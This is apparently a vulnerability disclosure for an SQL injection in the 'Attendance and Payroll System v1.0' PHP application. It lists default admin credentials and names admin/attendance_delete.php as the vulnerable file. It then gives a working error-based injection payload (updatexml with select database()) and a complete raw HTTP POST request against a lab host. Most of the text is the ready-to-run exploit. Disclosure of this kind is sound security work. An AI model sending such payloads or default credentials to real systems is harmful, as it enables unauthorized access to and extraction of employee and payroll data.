# Attendance and Payroll System v1.0 - SQL injection

username:nurhodelta password:password ----> {ip}apsystem/admin/index.php

Supplier： https://www.sourcecodester.com/php/12268/attendance-and-payroll-system-using-php.html

\admin\attendance_delete.php has SQL injection

Payload: id=74' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&delete=

SQL injection because id can be closed

![image](https://user-images.githubusercontent.com/54017627/159223992-d6466348-8233-4285-9393-96a7bb0a117d.png)

```sql
POST /apsystem/admin/attendance_delete.php HTTP/1.1
Host: 192.168.1.17
Content-Length: 74
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.17
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.17/apsystem/admin/attendance.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=2nud4pa7qt6oo5odl3120a4bta
Connection: close

id=74' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&delete=
```

![image](https://user-images.githubusercontent.com/54017627/159224105-0a0d6123-45d5-428b-8fe8-2249b8682d7d.png)

![image](https://user-images.githubusercontent.com/54017627/159224153-6a327a77-708d-4f70-987e-c04af33ad186.png)
